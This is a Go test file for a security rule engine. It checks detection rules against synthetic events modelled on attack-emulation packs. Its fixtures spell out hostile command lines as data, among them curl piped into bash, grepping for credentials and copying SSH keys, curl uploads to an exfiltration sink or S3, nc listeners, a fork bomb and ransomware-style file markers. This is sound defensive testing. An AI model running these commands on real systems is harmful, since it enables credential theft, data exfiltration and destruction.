package ruleengine

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"testing"
	"time"

	"github.com/t3rmit3/slither/agent/internal/telemetry"
	"github.com/t3rmit3/slither/pkg/ocsf"
	"github.com/t3rmit3/slither/pkg/ruleast"
)

// findRepoRoot walks upwards from this test file until it finds go.work.
// Local copy so this test does not depend on the integration-tagged helper
// in the app package.
func findRepoRoot(t *testing.T) string {
	t.Helper()
	_, here, _, _ := runtime.Caller(0)
	dir := filepath.Dir(here)
	for i := 0; i < 8; i++ {
		if _, err := os.Stat(filepath.Join(dir, "go.work")); err == nil {
			return dir
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	t.Fatalf("findRepoRoot: could not find go.work starting from %s", filepath.Dir(here))
	return ""
}

// Validates the four rules added for eyeexam-packs/linux-core (eye-101..105)
// against synthetic OCSF events shaped like what the agent collector would
// emit when each test runs. No eBPF, no root — just the rule engine.
//
// eye-101 maps to the pre-existing proc-curl-pipe-shell rule (id ...000003);
// it's included here so a regression in that rule shows up next to its
// eyeexam test. eye-102 expects two rules (decode + exec-from-tmp).

func loadRule(t *testing.T, repoRel string) *ruleast.Rule {
	t.Helper()
	root := findRepoRoot(t)
	path := filepath.Join(root, repoRel)
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	art, _, _, err := ruleast.Compile(b)
	if err != nil {
		t.Fatalf("compile %s: %v", path, err)
	}
	return art.Rule
}

// runOne feeds a single process-creation event into a one-rule engine and
// returns the number of DetectionFinding events emitted.
func runOne(t *testing.T, rule *ruleast.Rule, ev *ocsf.ProcessActivity) int {
	t.Helper()
	rules, err := CompileRules([]*ruleast.Rule{rule})
	if err != nil {
		t.Fatalf("CompileRules: %v", err)
	}
	eng := New(rules, telemetry.NewCounters()).(*engine)
	in := make(chan ocsf.Event, 1)
	in <- ev
	close(in)
	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	if err := eng.Run(ctx, in); err != nil {
		t.Fatalf("Run: %v", err)
	}
	var findings int
	for out := range eng.Output() {
		if f, ok := out.(*ocsf.DetectionFinding); ok && f.RuleInfo.UID == rule.ID {
			findings++
		}
	}
	return findings
}

func TestEyeexamPack_LinuxCore(t *testing.T) {
	cases := []struct {
		name      string
		ruleFile  string
		image     string
		cmdline   string
		wantFires bool
	}{
		// eye-101: bash -c "curl ... | bash" — parent shell carries the full
		// pipeline in its cmdline.
		{
			name:      "eye-101_curl_pipe_bash_parent_shell",
			ruleFile:  "rules/linux/proc-curl-pipe-shell.yml",
			image:     "/usr/bin/bash",
			cmdline:   "bash -c curl -sS file:///tmp/eyeexam-101/payload.sh | bash",
			wantFires: true,
		},
		// Negative for rule 003: curl alone (no pipe) shouldn't fire.
		{
			name:      "neg_curl_without_pipe",
			ruleFile:  "rules/linux/proc-curl-pipe-shell.yml",
			image:     "/usr/bin/bash",
			cmdline:   "bash -c curl -sS file:///tmp/x -o /tmp/y",
			wantFires: false,
		},
		// Negative for rule 003: shell pipe without a downloader.
		{
			name:      "neg_pipe_without_downloader",
			ruleFile:  "rules/linux/proc-curl-pipe-shell.yml",
			image:     "/usr/bin/bash",
			cmdline:   "bash -c cat /etc/os-release | bash",
			wantFires: false,
		},
		// eye-102 part 1: parent shell decoding base64 into /tmp.
		{
			name:      "eye-102_base64_decode_to_sandbox",
			ruleFile:  "rules/linux/proc-base64-decode-to-sandbox.yml",
			image:     "/usr/bin/bash",
			cmdline:   "bash -c printf %s $blob | base64 -d > /tmp/eyeexam-102/payload",
			wantFires: true,
		},
		// eye-102 part 2: the decoded payload is then executed from /tmp.
		{
			name:      "eye-102_exec_from_tmp",
			ruleFile:  "rules/linux/proc-exec-from-world-writable.yml",
			image:     "/tmp/eyeexam-102/payload",
			cmdline:   "/tmp/eyeexam-102/payload",
			wantFires: true,
		},
		// eye-103: python3 -c "..." carrying the __import__('os') token
		// to satisfy the tightened rule 014 (which now requires a
		// suspicious-token co-occurrence to fire).
		{
			name:      "eye-103_python_inline",
			ruleFile:  "rules/linux/proc-python-inline-script.yml",
			image:     "/usr/bin/python3",
			cmdline:   `python3 -c open('/tmp/eyeexam-103/marker','w').write(str(__import__('os').getpid()))`,
			wantFires: true,
		},
		// eye-104: shebang script execed from /tmp.
		{
			name:      "eye-104_shebang_from_tmp",
			ruleFile:  "rules/linux/proc-exec-from-world-writable.yml",
			image:     "/tmp/eyeexam-104/run.sh",
			cmdline:   "/tmp/eyeexam-104/run.sh",
			wantFires: true,
		},
		// eye-105: parent shell truncating a sandbox messages file.
		{
			name:      "eye-105_log_truncate_parent_shell",
			ruleFile:  "rules/linux/proc-log-truncate.yml",
			image:     "/usr/bin/bash",
			cmdline:   "bash -c cat /dev/null > /tmp/eyeexam-105/log/messages",
			wantFires: true,
		},
		// Negatives: rule 015 fires on /tmp execs but should NOT fire on a
		// normal /usr/bin process — guards against the broad startswith.
		{
			name:      "neg_normal_bin_not_world_writable",
			ruleFile:  "rules/linux/proc-exec-from-world-writable.yml",
			image:     "/usr/bin/ls",
			cmdline:   "ls -la",
			wantFires: false,
		},
		// Negative: rule 014 should not fire on python without -c.
		{
			name:      "neg_python_script_file_not_inline",
			ruleFile:  "rules/linux/proc-python-inline-script.yml",
			image:     "/usr/bin/python3",
			cmdline:   "python3 /opt/app/main.py",
			wantFires: false,
		},
		// Negative: rule 014 should not fire on bare `python -c` without a
		// suspicious token (cloud-init / ansible / dpkg postinst noise).
		{
			name:      "neg_python_inline_no_suspicious_tokens",
			ruleFile:  "rules/linux/proc-python-inline-script.yml",
			image:     "/usr/bin/python3",
			cmdline:   "python3 -c print('hello')",
			wantFires: false,
		},
		// Negative: rule 016 should not fire on a non-log truncate.
		{
			name:      "neg_truncate_unrelated_file",
			ruleFile:  "rules/linux/proc-log-truncate.yml",
			image:     "/usr/bin/bash",
			cmdline:   "bash -c cat /dev/null > /tmp/scratch/notes.txt",
			wantFires: false,
		},

		// linux-discovery pack (eye-301..305; eye-306 / eye-307 are covered
		// by pre-existing slither rules already exercised elsewhere).

		// eye-301: hostnamectl invocation.
		{
			name:      "eye-301_hostnamectl",
			ruleFile:  "rules/linux/proc-host-recon-hostnamectl.yml",
			image:     "/usr/bin/hostnamectl",
			cmdline:   "hostnamectl",
			wantFires: true,
		},
		// eye-302: cat /etc/passwd
		{
			name:      "eye-302_cat_etc_passwd",
			ruleFile:  "rules/linux/proc-passwd-file-read.yml",
			image:     "/usr/bin/cat",
			cmdline:   "cat /etc/passwd",
			wantFires: true,
		},
		// eye-302: getent passwd (parent shell)
		{
			name:      "eye-302_getent_passwd",
			ruleFile:  "rules/linux/proc-passwd-file-read.yml",
			image:     "/usr/bin/getent",
			cmdline:   "getent passwd",
			wantFires: true,
		},
		// eye-303: ss -tulpn
		{
			name:      "eye-303_ss_listen_enum",
			ruleFile:  "rules/linux/proc-network-listen-enum.yml",
			image:     "/usr/bin/ss",
			cmdline:   "ss -tulpn",
			wantFires: true,
		},
		// eye-304: ps -ef redirected to /tmp (parent shell carries the redirect).
		{
			name:      "eye-304_ps_to_tmp",
			ruleFile:  "rules/linux/proc-process-enum-to-file.yml",
			image:     "/usr/bin/bash",
			cmdline:   "bash -c ps -ef > /tmp/eyeexam-304/ps-ef.out",
			wantFires: true,
		},
		// eye-305: sudo -n -l
		{
			name:      "eye-305_sudo_rights_probe",
			ruleFile:  "rules/linux/proc-sudo-rights-probe.yml",
			image:     "/usr/bin/sudo",
			cmdline:   "sudo -n -l",
			wantFires: true,
		},

		// Negatives for the discovery rules.

		// Rule 018 should not fire on /etc/passwd in unrelated context.
		{
			name:      "neg_grep_passwd_file",
			ruleFile:  "rules/linux/proc-passwd-file-read.yml",
			image:     "/usr/bin/grep",
			cmdline:   "grep root /home/user/notes.txt",
			wantFires: false,
		},
		// Rule 019 should not fire on bare ss without the recon flag combos.
		{
			name:      "neg_ss_default",
			ruleFile:  "rules/linux/proc-network-listen-enum.yml",
			image:     "/usr/bin/ss",
			cmdline:   "ss",
			wantFires: false,
		},
		// Rule 01a should not fire on ps without staging redirect.
		{
			name:      "neg_ps_interactive",
			ruleFile:  "rules/linux/proc-process-enum-to-file.yml",
			image:     "/usr/bin/ps",
			cmdline:   "ps -ef",
			wantFires: false,
		},
		// Rule 01b should not fire on interactive sudo.
		{
			name:      "neg_sudo_interactive",
			ruleFile:  "rules/linux/proc-sudo-rights-probe.yml",
			image:     "/usr/bin/sudo",
			cmdline:   "sudo apt update",
			wantFires: false,
		},

		// linux-credaccess pack — process-creation cases. eye-201 and eye-204
		// are file_event rules and are exercised in TestEyeexamPack_FileEvents.

		// eye-202: grep .bash_history for cred patterns.
		{
			name:      "eye-202_history_cred_grep",
			ruleFile:  "rules/linux/proc-history-cred-grep.yml",
			image:     "/usr/bin/grep",
			cmdline:   "grep -E password=|api_key=|secret=|token= /tmp/eyeexam-202/.bash_history",
			wantFires: true,
		},
		// eye-203: cp ... id_rsa
		{
			name:      "eye-203_ssh_key_copy",
			ruleFile:  "rules/linux/proc-ssh-private-key-access.yml",
			image:     "/usr/bin/cp",
			cmdline:   "cp /tmp/eyeexam-203/.ssh/id_rsa /tmp/eyeexam-203/exfil/id_rsa",
			wantFires: true,
		},
		// eye-205: grep /proc/$$/environ
		{
			name:      "eye-205_procfs_environ_scrape",
			ruleFile:  "rules/linux/proc-procfs-environ-scrape.yml",
			image:     "/usr/bin/grep",
			cmdline:   "grep -aE TOKEN|KEY|SECRET|PASS /proc/12345/environ",
			wantFires: true,
		},
		// eye-206: secret-tool invocation.
		{
			name:      "eye-206_secret_tool",
			ruleFile:  "rules/linux/proc-keyring-secret-tool.yml",
			image:     "/usr/bin/secret-tool",
			cmdline:   "secret-tool --version",
			wantFires: true,
		},

		// Negatives for the credaccess proc rules.

		// Rule 01c should not fire when grep target lacks a history file.
		{
			name:      "neg_grep_creds_in_app_log",
			ruleFile:  "rules/linux/proc-history-cred-grep.yml",
			image:     "/usr/bin/grep",
			cmdline:   "grep -E password= /var/log/app.log",
			wantFires: false,
		},
		// Rule 01d should not fire on cp of an unrelated file.
		{
			name:      "neg_cp_unrelated_file",
			ruleFile:  "rules/linux/proc-ssh-private-key-access.yml",
			image:     "/usr/bin/cp",
			cmdline:   "cp /etc/hosts /tmp/scratch/hosts",
			wantFires: false,
		},
		// Rule 01f should not fire on cat of /proc/cpuinfo.
		{
			name:      "neg_cat_proc_cpuinfo",
			ruleFile:  "rules/linux/proc-procfs-environ-scrape.yml",
			image:     "/usr/bin/cat",
			cmdline:   "cat /proc/cpuinfo",
			wantFires: false,
		},

		// linux-c2 pack — process-creation cases. eye-604 (network_connection)
		// is exercised in TestEyeexamPack_NetworkEvents.

		// eye-601: dig TXT query against .invalid TLD.
		{
			name:      "eye-601_dig_txt_invalid",
			ruleFile:  "rules/linux/proc-dns-suspicious-query.yml",
			image:     "/usr/bin/dig",
			cmdline:   "dig +short TXT eyeexam-beacon.invalid",
			wantFires: true,
		},
		// eye-602: curl with EyeExamAgent UA.
		{
			name:      "eye-602_curl_custom_ua",
			ruleFile:  "rules/linux/proc-curl-custom-user-agent.yml",
			image:     "/usr/bin/curl",
			cmdline:   "curl -sS -m 2 -A EyeExamAgent/1.0 http://127.0.0.1:1/eyeexam-beacon-1",
			wantFires: true,
		},
		// eye-603: nc listener.
		{
			name:      "eye-603_nc_listener",
			ruleFile:  "rules/linux/proc-nc-listener.yml",
			image:     "/usr/bin/nc",
			cmdline:   "nc -l -p 34521 127.0.0.1",
			wantFires: true,
		},
		// eye-605 part 1: dig with base32 padding.
		{
			name:      "eye-605_dig_base32_marker",
			ruleFile:  "rules/linux/proc-dns-tunnel-marker.yml",
			image:     "/usr/bin/dig",
			cmdline:   "dig +short TXT MFRGGZDFMZTWQ2LK5UXG6JBA====.eye605.invalid",
			wantFires: true,
		},
		// eye-605 part 2: also matches the suspicious-query rule (TXT + .invalid).
		{
			name:      "eye-605_dig_also_matches_suspicious_query",
			ruleFile:  "rules/linux/proc-dns-suspicious-query.yml",
			image:     "/usr/bin/dig",
			cmdline:   "dig +short TXT MFRGGZDFMZTWQ2LK5UXG6JBA====.eye605.invalid",
			wantFires: true,
		},

		// Negatives for the c2 proc rules.

		// Rule 021 should not fire on dig A query against a real TLD.
		{
			name:      "neg_dig_a_query_real_domain",
			ruleFile:  "rules/linux/proc-dns-suspicious-query.yml",
			image:     "/usr/bin/dig",
			cmdline:   "dig +short A example.com",
			wantFires: false,
		},
		// Rule 022 should not fire on dig without base32 padding.
		{
			name:      "neg_dig_no_base32_padding",
			ruleFile:  "rules/linux/proc-dns-tunnel-marker.yml",
			image:     "/usr/bin/dig",
			cmdline:   "dig +short TXT example.com",
			wantFires: false,
		},
		// Rule 023 should not fire on curl without -A.
		{
			name:      "neg_curl_default_ua",
			ruleFile:  "rules/linux/proc-curl-custom-user-agent.yml",
			image:     "/usr/bin/curl",
			cmdline:   "curl -sS https://example.com/",
			wantFires: false,
		},
		// Rule 024 should not fire on nc connect (no -l).
		{
			name:      "neg_nc_client_connect",
			ruleFile:  "rules/linux/proc-nc-listener.yml",
			image:     "/usr/bin/nc",
			cmdline:   "nc -w 1 127.0.0.1 34521",
			wantFires: false,
		},

		// linux-persistence pack — process-creation cases. eye-401/402/403/
		// 404/405 are file_event rules and are exercised in
		// TestEyeexamPack_FileEvents.

		// eye-406: at scheduling.
		{
			name:      "eye-406_at_invocation",
			ruleFile:  "rules/linux/proc-at-job-schedule.yml",
			image:     "/usr/bin/at",
			cmdline:   "at now + 5 minutes",
			wantFires: true,
		},
		// Negative: any non-at /usr/bin/* must not fire rule 028.
		{
			name:      "neg_at_unrelated_binary",
			ruleFile:  "rules/linux/proc-at-job-schedule.yml",
			image:     "/usr/bin/cat",
			cmdline:   "cat /etc/hosts",
			wantFires: false,
		},

		// linux-lateral pack.

		// eye-501: ssh with BatchMode + StrictHostKeyChecking=no
		{
			name:      "eye-501_ssh_noninteractive",
			ruleFile:  "rules/linux/proc-ssh-noninteractive-flags.yml",
			image:     "/usr/bin/ssh",
			cmdline:   "ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=2 localhost true",
			wantFires: true,
		},
		// eye-502: scp with the same scripted-flag pattern.
		{
			name:      "eye-502_scp_noninteractive",
			ruleFile:  "rules/linux/proc-ssh-noninteractive-flags.yml",
			image:     "/usr/bin/scp",
			cmdline:   "scp -o BatchMode=yes -o StrictHostKeyChecking=no /tmp/eyeexam-502/marker localhost:/tmp/eyeexam-502/dst/marker",
			wantFires: true,
		},
		// Negatives.
		{
			name:      "neg_ssh_interactive",
			ruleFile:  "rules/linux/proc-ssh-noninteractive-flags.yml",
			image:     "/usr/bin/ssh",
			cmdline:   "ssh user@somehost",
			wantFires: false,
		},

		// linux-exfil pack — proc-creation cases. eye-705 reuses dns rules
		// already exercised in the linux-c2 cases.

		// eye-701: tar of /etc paths into /tmp.
		{
			name:      "eye-701_tar_etc_to_tmp",
			ruleFile:  "rules/linux/proc-tar-system-paths-staged.yml",
			image:     "/usr/bin/tar",
			cmdline:   "tar czf /tmp/eyeexam-701/stage.tgz /etc/hostname /etc/os-release",
			wantFires: true,
		},
		// eye-702: zip with -P.
		{
			name:      "eye-702_zip_with_password",
			ruleFile:  "rules/linux/proc-zip-password-protected.yml",
			image:     "/usr/bin/zip",
			cmdline:   "zip -P eyeexam-702-weakpw /tmp/eyeexam-702/loot.zip /tmp/eyeexam-702/data.txt",
			wantFires: true,
		},
		// eye-704: curl POST --data-binary @
		{
			name:      "eye-704_curl_post_data_binary",
			ruleFile:  "rules/linux/proc-curl-post-data-binary.yml",
			image:     "/usr/bin/curl",
			cmdline:   "curl -sS -m 2 -X POST --data-binary @/tmp/eyeexam-704/payload.bin http://127.0.0.1:1/eyeexam-exfil-sink",
			wantFires: true,
		},
		// eye-706: curl PUT --upload-file to s3.amazonaws.com.
		{
			name:      "eye-706_curl_put_to_s3",
			ruleFile:  "rules/linux/proc-curl-cloud-bucket-put.yml",
			image:     "/usr/bin/curl",
			cmdline:   "curl -sS -m 2 -X PUT --upload-file /tmp/eyeexam-706/payload.bin https://eyeexam-test-bucket.s3.amazonaws.com/eye-706/payload.bin",
			wantFires: true,
		},
		// Negatives for exfil.
		{
			name:      "neg_tar_local_to_local",
			ruleFile:  "rules/linux/proc-tar-system-paths-staged.yml",
			image:     "/usr/bin/tar",
			cmdline:   "tar czf /tmp/build.tgz /home/user/project",
			wantFires: true, // /home/ is in the system_source list — intentional
		},
		{
			name:      "neg_tar_no_system_source",
			ruleFile:  "rules/linux/proc-tar-system-paths-staged.yml",
			image:     "/usr/bin/tar",
			cmdline:   "tar czf /tmp/build.tgz /opt/project",
			wantFires: false,
		},
		{
			name:      "neg_zip_no_password",
			ruleFile:  "rules/linux/proc-zip-password-protected.yml",
			image:     "/usr/bin/zip",
			cmdline:   "zip /tmp/archive.zip /tmp/file",
			wantFires: false,
		},
		{
			name:      "neg_curl_get_no_post",
			ruleFile:  "rules/linux/proc-curl-post-data-binary.yml",
			image:     "/usr/bin/curl",
			cmdline:   "curl -sS https://example.com/",
			wantFires: false,
		},
		{
			name:      "neg_curl_put_to_non_cloud",
			ruleFile:  "rules/linux/proc-curl-cloud-bucket-put.yml",
			image:     "/usr/bin/curl",
			cmdline:   "curl -sS -X PUT --upload-file /tmp/x https://example.com/upload",
			wantFires: false,
		},

		// linux-impact pack — proc-creation cases. eye-801 (ransomware
		// marker) is a file_event rule, exercised in TestEyeexamPack_FileEvents.

		// eye-802: dd from /dev/urandom into a /tmp file.
		{
			name:      "eye-802_dd_disk_wipe_sandbox",
			ruleFile:  "rules/linux/proc-disk-wipe-dd.yml",
			image:     "/usr/bin/dd",
			cmdline:   "dd if=/dev/urandom of=/tmp/eyeexam-802/data bs=1M count=10",
			wantFires: true,
		},
		// eye-803: bash with fork-bomb shape in argv.
		{
			name:      "eye-803_fork_bomb_pattern",
			ruleFile:  "rules/linux/proc-fork-bomb-pattern.yml",
			image:     "/usr/bin/bash",
			cmdline:   "bash -c ulimit -u 50; :(){ :|:& };:",
			wantFires: true,
		},
		// eye-804: bash subshell yes > /dev/null.
		{
			name:      "eye-804_cpu_burn_yes",
			ruleFile:  "rules/linux/proc-cpu-burn-yes.yml",
			image:     "/usr/bin/bash",
			cmdline:   "bash -c yes > /dev/null",
			wantFires: true,
		},
		// eye-805: shutdown invocation.
		{
			name:      "eye-805_shutdown_invocation",
			ruleFile:  "rules/linux/proc-shutdown-invocation.yml",
			image:     "/usr/sbin/shutdown",
			cmdline:   "shutdown -k +60 eyeexam-805 BAS test (no real shutdown)",
			wantFires: true,
		},
		// Negatives for impact.
		{
			name:      "neg_dd_to_devnull_excluded",
			ruleFile:  "rules/linux/proc-disk-wipe-dd.yml",
			image:     "/usr/bin/dd",
			cmdline:   "dd if=/dev/urandom of=/dev/null bs=1M count=1",
			wantFires: false,
		},
		{
			name:      "neg_normal_bash_no_fork_bomb",
			ruleFile:  "rules/linux/proc-fork-bomb-pattern.yml",
			image:     "/usr/bin/bash",
			cmdline:   "bash -c ls -la",
			wantFires: false,
		},
		{
			name:      "neg_bash_yes_other_target",
			ruleFile:  "rules/linux/proc-cpu-burn-yes.yml",
			image:     "/usr/bin/bash",
			cmdline:   "bash -c yes | head -10",
			wantFires: false,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rule := loadRule(t, tc.ruleFile)
			fires := runOne(t, rule, processActivity(tc.image, tc.cmdline))
			switch {
			case tc.wantFires && fires == 0:
				t.Errorf("rule %s did not fire on %q (image=%s)", rule.ID, tc.cmdline, tc.image)
			case !tc.wantFires && fires > 0:
				t.Errorf("rule %s fired %d times on %q but should not have", rule.ID, fires, tc.cmdline)
			}
		})
	}
}

// runOneFile feeds a single file-system-activity event into a one-rule
// engine and returns the number of DetectionFinding events emitted for
// that rule.
func runOneFile(t *testing.T, rule *ruleast.Rule, ev *ocsf.FileSystemActivity) int {
	t.Helper()
	rules, err := CompileRules([]*ruleast.Rule{rule})
	if err != nil {
		t.Fatalf("CompileRules: %v", err)
	}
	eng := New(rules, telemetry.NewCounters()).(*engine)
	in := make(chan ocsf.Event, 1)
	in <- ev
	close(in)
	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	if err := eng.Run(ctx, in); err != nil {
		t.Fatalf("Run: %v", err)
	}
	var findings int
	for out := range eng.Output() {
		if f, ok := out.(*ocsf.DetectionFinding); ok && f.RuleInfo.UID == rule.ID {
			findings++
		}
	}
	return findings
}

// File-event-rule fixtures for eyeexam-packs/linux-credaccess. Uses the
// fileActivityFixture helper from file_match_test.go (same package).
func TestEyeexamPack_FileEvents(t *testing.T) {
	cases := []struct {
		name      string
		ruleFile  string
		path      string
		exe       string
		wantFires bool
	}{
		// eye-201: cat reading /etc/shadow.
		{
			name:      "eye-201_shadow_read_via_cat",
			ruleFile:  "rules/linux/file-etc-shadow-access.yml",
			path:      "/etc/shadow",
			exe:       "/usr/bin/cat",
			wantFires: true,
		},
		// Negative: passwd utility writing to /etc/shadow is in the allowed list.
		{
			name:      "neg_shadow_passwd_allowed",
			ruleFile:  "rules/linux/file-etc-shadow-access.yml",
			path:      "/etc/shadow",
			exe:       "/usr/bin/passwd",
			wantFires: false,
		},
		// eye-204: cat reading a sandbox ~/.aws/credentials path.
		{
			name:      "eye-204_aws_credentials_sandbox",
			ruleFile:  "rules/linux/file-aws-credentials-read.yml",
			path:      "/tmp/eyeexam-204/.aws/credentials",
			exe:       "/usr/bin/cat",
			wantFires: true,
		},
		// eye-204: also matches the canonical home path.
		{
			name:      "eye-204_aws_credentials_home",
			ruleFile:  "rules/linux/file-aws-credentials-read.yml",
			path:      "/home/user/.aws/credentials",
			exe:       "/usr/bin/cat",
			wantFires: true,
		},
		// Negative: unrelated /tmp file.
		{
			name:      "neg_aws_unrelated_file",
			ruleFile:  "rules/linux/file-aws-credentials-read.yml",
			path:      "/tmp/scratch/notes.txt",
			exe:       "/usr/bin/cat",
			wantFires: false,
		},

		// linux-persistence pack — file_event cases. eye-406 (process_creation
		// for `at`) is exercised in TestEyeexamPack_LinuxCore.

		// eye-401: crontab write to /var/spool/cron/<user>.
		{
			name:      "eye-401_cron_user_write",
			ruleFile:  "rules/linux/file-cron-persistence.yml",
			path:      "/var/spool/cron/crontabs/t3rmit3",
			exe:       "/usr/bin/crontab",
			wantFires: true,
		},
		// eye-402: systemd user unit write.
		{
			name:      "eye-402_systemd_user_unit",
			ruleFile:  "rules/linux/file-systemd-user-unit-write.yml",
			path:      "/home/t3rmit3/.config/systemd/user/eyeexam-402.service",
			exe:       "/usr/bin/bash",
			wantFires: true,
		},
		// eye-402 negative: dpkg-installed system unit must not fire.
		{
			name:      "neg_systemd_unit_via_dpkg",
			ruleFile:  "rules/linux/file-systemd-user-unit-write.yml",
			path:      "/etc/systemd/system/postgresql.service",
			exe:       "/usr/bin/dpkg",
			wantFires: false,
		},
		// eye-402 negative: a stray .conf in the user dir is not a unit.
		{
			name:      "neg_systemd_user_conf_not_unit",
			ruleFile:  "rules/linux/file-systemd-user-unit-write.yml",
			path:      "/home/t3rmit3/.config/systemd/user/notes.conf",
			exe:       "/usr/bin/bash",
			wantFires: false,
		},
		// eye-403: ~/.bashrc append.
		{
			name:      "eye-403_bashrc_append",
			ruleFile:  "rules/linux/file-rc-persistence.yml",
			path:      "/home/t3rmit3/.bashrc",
			exe:       "/usr/bin/bash",
			wantFires: true,
		},
		// eye-404: authorized_keys append.
		{
			name:      "eye-404_authorized_keys_append",
			ruleFile:  "rules/linux/file-authorized-keys-write.yml",
			path:      "/home/t3rmit3/.ssh/authorized_keys",
			exe:       "/usr/bin/bash",
			wantFires: true,
		},
		// eye-405: motd-d script drop (sandbox path).
		{
			name:      "eye-405_motd_sandbox",
			ruleFile:  "rules/linux/file-motd-script-drop.yml",
			path:      "/tmp/eyeexam-405/update-motd.d/99-eyeexam",
			exe:       "/usr/bin/bash",
			wantFires: true,
		},
		// eye-405: also matches the canonical /etc path.
		{
			name:      "eye-405_motd_canonical",
			ruleFile:  "rules/linux/file-motd-script-drop.yml",
			path:      "/etc/update-motd.d/99-eyeexam",
			exe:       "/usr/bin/bash",
			wantFires: true,
		},

		// linux-impact pack — file_event case.

		// eye-801: rename to .eyeexam-locked extension.
		{
			name:      "eye-801_locked_extension",
			ruleFile:  "rules/linux/file-ransomware-marker.yml",
			path:      "/tmp/eyeexam-801/victim/doc-1.txt.eyeexam-locked",
			exe:       "/usr/bin/mv",
			wantFires: true,
		},
		// eye-801: ransom note drop.
		{
			name:      "eye-801_ransom_note_drop",
			ruleFile:  "rules/linux/file-ransomware-marker.yml",
			path:      "/tmp/eyeexam-801/victim/RANSOM_NOTE.txt",
			exe:       "/usr/bin/bash",
			wantFires: true,
		},
		// Negative: a normal /tmp/notes.txt is not a ransom marker.
		{
			name:      "neg_ransom_unrelated_txt",
			ruleFile:  "rules/linux/file-ransomware-marker.yml",
			path:      "/tmp/scratch/notes.txt",
			exe:       "/usr/bin/bash",
			wantFires: false,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rule := loadRule(t, tc.ruleFile)
			fires := runOneFile(t, rule, fileActivityFixture(tc.path, tc.exe))
			switch {
			case tc.wantFires && fires == 0:
				t.Errorf("rule %s did not fire on path=%s exe=%s", rule.ID, tc.path, tc.exe)
			case !tc.wantFires && fires > 0:
				t.Errorf("rule %s fired %d times on path=%s exe=%s but should not have",
					rule.ID, fires, tc.path, tc.exe)
			}
		})
	}
}

// runOneNet feeds a single network-activity event into a one-rule engine
// and returns the number of matching DetectionFinding events emitted.
func runOneNet(t *testing.T, rule *ruleast.Rule, ev *ocsf.NetworkActivity) int {
	t.Helper()
	rules, err := CompileRules([]*ruleast.Rule{rule})
	if err != nil {
		t.Fatalf("CompileRules: %v", err)
	}
	eng := New(rules, telemetry.NewCounters()).(*engine)
	in := make(chan ocsf.Event, 1)
	in <- ev
	close(in)
	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	if err := eng.Run(ctx, in); err != nil {
		t.Fatalf("Run: %v", err)
	}
	var findings int
	for out := range eng.Output() {
		if f, ok := out.(*ocsf.DetectionFinding); ok && f.RuleInfo.UID == rule.ID {
			findings++
		}
	}
	return findings
}

// Network-connection-rule fixtures for eyeexam-packs/linux-c2 (eye-604).
// Uses netActivityFixture from net_match_test.go (same package).
func TestEyeexamPack_NetworkEvents(t *testing.T) {
	cases := []struct {
		name      string
		ruleFile  string
		proto     string
		dstIP     string
		dstPort   uint16
		exe       string
		wantFires bool
	}{
		// eye-604: connection attempt to Tor SOCKS port.
		{
			name:      "eye-604_tor_socks_9050",
			ruleFile:  "rules/linux/net-tor-port-egress.yml",
			proto:     "tcp", dstIP: "127.0.0.1", dstPort: 9050,
			exe:       "/usr/bin/nc",
			wantFires: true,
		},
		// eye-604: control port.
		{
			name:      "eye-604_tor_control_9051",
			ruleFile:  "rules/linux/net-tor-port-egress.yml",
			proto:     "tcp", dstIP: "127.0.0.1", dstPort: 9051,
			exe:       "/usr/bin/nc",
			wantFires: true,
		},
		// eye-604: relay/OR port.
		{
			name:      "eye-604_tor_or_9001",
			ruleFile:  "rules/linux/net-tor-port-egress.yml",
			proto:     "tcp", dstIP: "127.0.0.1", dstPort: 9001,
			exe:       "/usr/bin/nc",
			wantFires: true,
		},
		// Negative: a normal HTTP port should not fire.
		{
			name:      "neg_tor_normal_http",
			ruleFile:  "rules/linux/net-tor-port-egress.yml",
			proto:     "tcp", dstIP: "203.0.113.9", dstPort: 80,
			exe:       "/usr/bin/curl",
			wantFires: false,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rule := loadRule(t, tc.ruleFile)
			fires := runOneNet(t, rule, netActivityFixture(tc.proto, tc.dstIP, tc.dstPort, tc.exe))
			switch {
			case tc.wantFires && fires == 0:
				t.Errorf("rule %s did not fire on %s://%s:%d", rule.ID, tc.proto, tc.dstIP, tc.dstPort)
			case !tc.wantFires && fires > 0:
				t.Errorf("rule %s fired %d times on %s://%s:%d but should not have",
					rule.ID, fires, tc.proto, tc.dstIP, tc.dstPort)
			}
		})
	}
}
